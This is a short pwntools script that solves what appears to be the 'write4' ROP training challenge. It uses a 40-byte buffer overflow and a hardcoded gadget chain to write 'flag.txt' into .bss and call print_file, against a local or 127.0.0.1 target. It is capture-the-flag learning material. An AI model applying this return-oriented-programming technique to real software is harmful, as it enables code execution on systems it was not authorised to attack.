#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./write4')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./write4', gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process('./write4')
r = start()

offset = 40
print_file = 0x0000000000400510
pop_r14r15 = 0x0000000000400690
mover14r15 = 0x0000000000400628
bss = 0x0000000000601038 
pop_rdi = 0x0000000000400693

payload = [
        b"A"*offset,
        p64(pop_r14r15),
        p64(bss),
        b"flag.txt",
        p64(mover14r15),
        p64(pop_rdi),
        p64(bss),
        p64(print_file)
        ]
payload = b"".join(payload)
r.recvuntil(b">")
r.sendline(payload)
#========= interactive ====================
r.interactive()
